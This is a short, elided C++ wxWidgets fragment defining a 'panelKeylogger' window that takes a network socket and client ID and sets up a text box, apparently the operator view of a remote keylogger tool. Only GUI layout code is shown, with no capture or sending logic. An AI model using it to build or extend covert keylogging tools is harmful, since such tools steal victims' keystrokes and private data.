...
wxBEGIN_EVENT_TABLE(panelKeylogger, wxFrame)
...
panelKeylogger::panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID) :
	...
	this->txt_Data = new wxTextCtrl(this, EnumIDS::ID_KL_Text_Out, wxEmptyString, wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_RICH);
	...
	sizer2->Add(sizer, 0, wxALL | wxEXPAND);
